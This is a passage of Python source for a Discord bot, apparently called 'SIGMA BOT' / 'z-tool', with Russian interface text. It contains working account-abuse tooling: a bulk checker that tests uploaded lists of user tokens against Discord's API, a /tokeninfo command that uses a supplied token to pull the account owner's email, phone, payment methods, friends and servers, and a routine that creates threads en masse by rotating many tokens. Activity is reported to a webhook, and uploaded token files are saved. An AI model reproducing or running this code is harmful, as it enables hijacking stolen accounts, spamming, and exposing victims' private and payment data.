                send_to_webhook(f"[Ошибка] Исключение при создании ветки токеном {token[:6]}...: {e}")
                log_error(token, f"thread_create: {str(e)}")

    async def run(self):
        status_task = asyncio.create_task(self.update_status())
        try:
            threads_to_create = min(self.total_threads, 10 * len(self.available_tokens))  
            created_threads = 0
            
            while created_threads < threads_to_create and self.available_tokens:
                token = random.choice(self.available_tokens)
                await self.create_thread(token)
                created_threads = self.success_count
                
                if created_threads >= threads_to_create:
                    break
                    
                await asyncio.sleep(0.5)
        finally:
            self.is_running = False
            await status_task
        
        console.print(f"[success]✅ Создание веток завершено: {self.success_count} успешно, {self.error_count} ошибок[/]")
        send_to_webhook(f"[Успех] Создание веток для {self.inter.author}: {self.success_count} успешно, {self.error_count} ошибок")
        return self.success_count, self.error_count

class TokenChecker:
    def __init__(self, tokens, max_check=500):
        self.valid_tokens = []
        self.invalid_tokens = []
        self.tokens = tokens[:max_check]  
        self.total_tokens = len(tokens) 
        self.semaphore = asyncio.Semaphore(30) 
        self.valid_structure_tokens = []

    def is_valid_token_structure(self, token):
        if not isinstance(token, str) or not (59 <= len(token) <= 88) or not DISCORD_TOKEN_PATTERN.match(token):
            return False
        try:
            parts = token.split('.')
            if len(parts) != 3:
                return False
            user_id_part = parts[0]
            decoded_id = base64.urlsafe_b64decode(user_id_part + "==").decode('utf-8')
            return decoded_id.isdigit()
        except (base64.binascii.Error, UnicodeDecodeError):
            return False

    async def check_token(self, session, token):
        async with self.semaphore:
            headers = {'Authorization': token}
            try:
                async with session.get("https://discord.com/api/v9/users/@me", headers=headers) as response:
                    if response.status == 200:
                        self.valid_tokens.append(token)
                    else:
                        self.invalid_tokens.append(token)
            except Exception:
                self.invalid_tokens.append(token)
            await asyncio.sleep(0.02)  

    async def run(self):
        start_time = time.time()

        self.valid_structure_tokens = [token for token in self.tokens if self.is_valid_token_structure(token)]
        if not self.valid_structure_tokens:
            self.invalid_tokens = self.tokens  
            return self.valid_tokens, self.invalid_tokens, 0

        async with aiohttp.ClientSession() as session:
            tasks = [self.check_token(session, token) for token in self.valid_structure_tokens]
            await asyncio.gather(*tasks)
        for token in self.tokens:
            if token not in self.valid_tokens and token not in self.invalid_tokens:
                self.invalid_tokens.append(token)

        end_time = time.time()
        return self.valid_tokens, self.invalid_tokens, end_time - start_time

@bot.slash_command(name="tokenchecker", description="Проверка до 500 токенов на валидность")
async def tokenchecker(
    inter: disnake.ApplicationCommandInteraction,
    tokens_file: disnake.Attachment = disnake_commands.Param(description="Текстовый файл с токенами (.txt)")
):
    await inter.response.defer(ephemeral=True)

    if not tokens_file.filename.endswith(".txt"):
        await inter.edit_original_response(content="Ошибка: файл должен быть текстовым (.txt).")
        return

    start_read_time = time.time()
    try:
        file_content = await save_tokens_file(tokens_file, inter.author.name)
        tokens = file_content.decode('utf-8').splitlines()
        tokens = [token.strip() for token in tokens if token.strip()]  
    except Exception as e:
        await inter.edit_original_response(content=f"Ошибка: {str(e)}")
        return
    read_time = time.time() - start_read_time

    if not tokens:
        await inter.edit_original_response(content="Ошибка: файл пустой, нет токенов для проверки.")
        return
        
    if await check_token_count(tokens, inter, inter.author):
        return

    checker = TokenChecker(tokens, max_check=300)
    has_valid_structure = any(checker.is_valid_token_structure(token) for token in tokens)
    if not has_valid_structure:
        await inter.edit_original_response(content="Ошибка: в файле нет токенов, только текст.")
        return

    valid, invalid, check_duration = await checker.run()
    
    masked_valid = []
    masked_invalid = []
       
    total_checked = len(tokens) 
    result = (
        f"Проверка завершена!\n"
        f"📖 Время чтения файла: {read_time:.2f} сек\n"
        f"⏱ Время проверки: {check_duration:.2f} сек\n"
        f"📜 Всего токенов в файле: {checker.total_tokens}\n"
        f"🔍 Проверено токенов: {total_checked}\n"
        f"✅ Валидных токенов: {len(valid)}\n"
        f"✖ Невалидных токенов: {total_checked - len(valid)}\n"
    )
               
    await inter.edit_original_response(content=result)

@bot.slash_command(name="tokeninfo", description="Получить информацию о Discord токене")
async def tokeninfo(
    inter: disnake.ApplicationCommandInteraction, 
    token: str = disnake_commands.Param(description="Токен Discord для проверки")
):
    if await check_protected_guild(inter):
        return
    await inter.response.defer(ephemeral=True)
    
    headers = {"Authorization": token.strip(), "User-Agent": random.choice(USER_AGENTS)}
    try:
        is_valid_structure = True
        try:
            parts = token.split('.')
            if len(parts) != 3:
                is_valid_structure = False
            else:
                user_id_part = parts[0]
                try:
                    decoded_id = base64.urlsafe_b64decode(user_id_part + "==").decode('utf-8')
                    if not decoded_id.isdigit():
                        is_valid_structure = False
                except:
                    is_valid_structure = False
        except:
            is_valid_structure = False
        
        if not is_valid_structure:
            await inter.edit_original_response(content="❌ Ошибка: Неверная структура токена.")
            log_error(token, "invalid_token_structure")
            return
    
        async with aiohttp.ClientSession() as session:
            async with session.get('https://discord.com/api/v9/users/@me', headers=headers) as r:
                if r.status != 200:
                    await inter.edit_original_response(content="❌ Ошибка: Неверный токен или токен недействителен.")
                    log_error(token, "token_info_invalid")
                    return
                
                user_data = await r.json()
            
            async with session.get('https://discordapp.com/api/v9/users/@me/billing/subscriptions', headers=headers) as nitro_resp:
                nitro_data = await nitro_resp.json() if nitro_resp.status == 200 else []
            
            async with session.get('https://discord.com/api/v9/users/@me/billing/payment-sources', headers=headers) as payment_resp:
                payment_data = await payment_resp.json() if payment_resp.status == 200 else []
            
            async with session.get('https://discord.com/api/v9/users/@me/guilds', headers=headers) as guilds_resp:
                guilds_data = await guilds_resp.json() if guilds_resp.status == 200 else []
            
            async with session.get('https://discord.com/api/v9/users/@me/relationships', headers=headers) as friends_resp:
                friends_data = await friends_resp.json() if friends_resp.status == 200 else []
            
            async with session.get('https://discord.com/api/v9/users/@me/settings', headers=headers) as settings_resp:
                settings_data = await settings_resp.json() if settings_resp.status == 200 else {}
        
        def get_badges(flags):
            badges = []
            badge_dict = {
                1: "Сотрудник", 2: "Партнёр", 4: "Событие Hypesquad", 8: "Зелёный Охотник за багами",
                64: "Храбрость", 128: "Блеск", 256: "Баланс", 512: "Ранний Поддерживающий",
                16384: "Золотой Охотник за багами", 131072: "Проверенный разработчик ботов"
            }
            for key, value in badge_dict.items():
                if flags & key:
                    badges.append(value)
            return ", ".join(badges) if badges else "Отсутствуют"
        
        has_nitro = bool(len(nitro_data) > 0)
        nitro_info = "Нет"
        days_left = 0
        
        if has_nitro:
            try:
                d1 = datetime.strptime(nitro_data[0]["current_period_end"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
                d2 = datetime.strptime(nitro_data[0]["current_period_start"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
                days_left = abs((d2 - d1).days)
                
                if nitro_data[0].get("type") == 1:
                    nitro_info = f"Classic (осталось {days_left} дней)"
                elif nitro_data[0].get("type") == 2:
                    nitro_info = f"Nitro (осталось {days_left} дней)"
                else:
                    nitro_info = f"Да (осталось {days_left} дней)"
            except:
                nitro_info = "Да (данные о сроке недоступны)"
        
        payment_methods = []
        for payment in payment_data:
            if payment.get("type") == 1:  
                last_4 = payment.get("last_4", "????")
                brand = payment.get("brand", "Неизвестно")
                payment_methods.append(f"Карта {brand} *{last_4}")
            elif payment.get("type") == 2:  
                email = payment.get("email", "Неизвестно")
                payment_methods.append(f"PayPal ({email})")
        
        payment_methods_str = ", ".join(payment_methods) if payment_methods else "Не найдены"
        
        badges = get_badges(user_data.get('flags', 0))
        
        token_creation_date = "Неизвестно"
        try:
            user_id = user_data.get('id')
            token_created_timestamp = ((int(user_id) >> 22) + 1420070400000) / 1000
            token_creation_date = datetime.fromtimestamp(token_created_timestamp).strftime('%d.%m.%Y %H:%M:%S')
        except:
            pass
        
        result = f"""```ini
[ИНФОРМАЦИЯ О ТОКЕНЕ]
Тип: {"Бот" if user_data.get('bot', False) else "Пользователь"}
Статус: {"✅ Валидный" if r.status == 200 else "❌ Невалидный"}
ID пользователя: {user_data.get('id', 'Неизвестно')}
Имя: {user_data.get('username', 'Неизвестно')}#{user_data.get('discriminator', '0000')}
Создан: {token_creation_date}
Email: {user_data.get('email', 'Не найден')}
Телефон: {user_data.get('phone', 'Не найден')}
Локализация: {user_data.get('locale', 'Не указана')}
Верифицирован: {"Да" if user_data.get('verified', False) else "Нет"}
2FA/MFA: {"Включено" if user_data.get('mfa_enabled', False) else "Выключено"}
Значки: {badges}
Nitro: {nitro_info}
Платежные методы: {payment_methods_str}

[СТАТИСТИКА]
Серверов: {len(guilds_data)}
Друзей: {len([f for f in friends_data if f.get('type') == 1])}
Заблокировано: {len([f for f in friends_data if f.get('type') == 2])}
Ожидающих запросов: {len([f for f in friends_data if f.get('type') in (3, 4)])}

[НАСТРОЙКИ]
Язык: {settings_data.get('locale', 'Не указан')}
Тема: {"Темная" if settings_data.get('theme') == 'dark' else "Светлая" if settings_data.get('theme') == 'light' else "Не указана"}
Статус: {settings_data.get('status', 'Не указан')}
```"""
        
        if guilds_data:
            owned_servers = [g for g in guilds_data if g.get('owner', False)]
            if owned_servers:
                result += "\n**Владелец серверов:**\n```"
                for i, guild in enumerate(owned_servers[:10]):
                    result += f"{i+1}. {guild.get('name', 'Неизвестно')} (ID: {guild.get('id', 'Неизвестно')})\n"
                if len(owned_servers) > 10:
                    result += f"...и еще {len(owned_servers) - 10} серверов\n"
                result += "```"
        
        avatar_hash = user_data.get('avatar')
        if avatar_hash:
            user_id = user_data.get('id')
            avatar_url = f"https://cdn.discordapp.com/avatars/{user_id}/{avatar_hash}.jpg?size=1024"
            result += f"\n**Аватар:** [Ссылка]({avatar_url})"
        
        banner_hash = user_data.get('banner')
        if banner_hash:
            user_id = user_data.get('id')
            banner_url = f"https://cdn.discordapp.com/banners/{user_id}/{banner_hash}.jpg?size=1024"
            result += f"\n**Баннер:** [Ссылка]({banner_url})"
        
        await inter.edit_original_response(content=result)
        console.print(f"[success]✅ Информация о токене {token[:10]}... успешно получена для {user_data.get('username', 'неизвестного пользователя')}[/]")
        send_to_webhook(f"[Успех] Получена информация о токене для {user_data.get('username', 'неизвестного пользователя')} пользователем {inter.author}")
        
    except Exception as e:
        await inter.edit_original_response(content=f"❌ Ошибка: {str(e)}")
        console.print(f"[error]❌ Ошибка получения информации о токене: {str(e)}[/]")
        log_error(token, "token_info_exception")

@tasks.loop(minutes=1)
async def auto_check_and_leave():
    MAX_SERVERS = 80

    if len(bot.guilds) >= MAX_SERVERS:
        for guild in bot.guilds:
            if guild.id not in excluded_server_ids:
                try:
                    await guild.leave()
                    console.print(f"[success]🔥 Покинул сервер: {guild.name} ({guild.id}) 🚀[/]")
                except disnake.errors.Forbidden:
                    console.print(f"[error]❌ Не удалось покинуть сервер: {guild.name} ({guild.id}), нет прав 😿[/]")

@bot.event
async def on_ready():
    global user_config
    banner = pyfiglet.figlet_format("SIGMA BOT")
    console.print(f"[success]✅ {banner}[/]")
    await bot.change_presence(activity=disnake.Streaming(name=f'z-tool 2025', url='https://www.twitch.tv/404%27'))
    auto_check_and_leave.start()
    channel = bot.get_channel(1367407046420332574)
    if channel:
        embed = disnake.Embed(title="", color=0x00ff00)
        embed.description = (f"✅ bot online")
        await channel.send(embed=embed)
    else:
        console.print(f'[error]❌ Ошибка: Канал не найден [/]')
    try:   
        table = Table(title="🤖 Полная Информация Бота", box=SIMPLE, style="cyan", title_style="bold magenta")
        table.add_column("Параметр", style="bold cyan")
        table.add_column("Значение", style="bold green")
        
        bot_name = f"{bot.user.name}#{bot.user.discriminator}" if bot.user else "Неизвестно"
        bot_id = str(bot.user.id) if bot.user else "Неизвестно"
        guilds_count = str(len(bot.guilds)) if bot.guilds else "0"
        created_at = bot.user.created_at.strftime("%d.%m.%Y %H:%M:%S") if bot.user else "Неизвестно"
        commands_count = str(len(bot.slash_commands)) if hasattr(bot, 'slash_commands') else "0"
        discord_version = disnake.__version__ if hasattr(disnake, '__version__') else "Неизвестно"
        mention = f"<@{bot.user.id}>" if bot.user else "Неизвестно"
        invite = f"https://discord.com/oauth2/authorize?client_id={bot.user.id}&scope=bot&permissions=8" if bot.user else "Неизвестно"
        prefix = bot.command_prefix if bot.command_prefix else "!"
        
        intent_names = ['default', 'guilds', 'members', 'bans', 'emojis', 'integrations', 'webhooks', 
                        'invites', 'voice_states', 'presences', 'messages', 'guild_messages', 
                        'dm_messages', 'reactions', 'guild_reactions', 'dm_reactions', 
                        'typing', 'guild_typing', 'dm_typing', 'message_content']
        active_intents = [name for name in intent_names if getattr(bot.intents, name, False)]
        intents_list = ", ".join(active_intents) if active_intents else "Неизвестно"
        
        table.add_row("Имя", bot_name)
        table.add_row("ID", bot_id)
        table.add_row("Серверов", guilds_count)
        table.add_row("Статус", "Активен")
        table.add_row("Дата создания", created_at)
        table.add_row("Команд", commands_count)
        table.add_row("Версия discord.py", discord_version)
        table.add_row("Ссылка", mention)
        table.add_row("Приглашение", invite)
        table.add_row("Префикс", prefix)
        table.add_row("Интенты", intents_list)
        
        console.print(table)
        console.print(f"[success]🤖 Бот {bot_name} готов к работе! 🚀[/]")
    except Exception as e:
        console.print(f"[error]❌ Ошибка в on_ready (основной бот): {e} 😿[/]")

if __name__ == "__main__":
    bot.run(BOT_TOKEN)
